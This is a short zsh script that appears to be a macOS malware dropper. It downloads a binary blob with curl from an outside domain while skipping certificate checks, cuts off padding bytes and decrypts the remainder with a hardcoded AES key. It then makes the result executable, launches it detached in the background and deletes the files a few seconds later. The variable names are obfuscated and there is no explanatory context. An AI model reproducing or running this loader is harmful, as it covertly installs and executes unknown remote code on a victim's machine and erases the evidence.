#!/bin/zsh
cwpe6=$(mktemp /tmp/2ds2bj.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mdd16aafbb082e56b.bin" -o "$cwpe6z" || exit 1
j7x6vn=$(stat -f %z "$cwpe6z"); vxgzzcj=$(( j7x6vn - 2094 - 2847 ))
tail -c +$(( 2094 + 1 )) "$cwpe6z" | head -c $vxgzzcj | openssl enc -d -aes-256-cbc -k 34e8f6c122e09b95576f9b4c -out "$cwpe6" 2>/dev/null
[ -s "$cwpe6" ] && chmod 700 "$cwpe6" && ( "$cwpe6" & ) && disown
( sleep 3; rm -f "$cwpe6" "$cwpe6z" ) &>/dev/null &
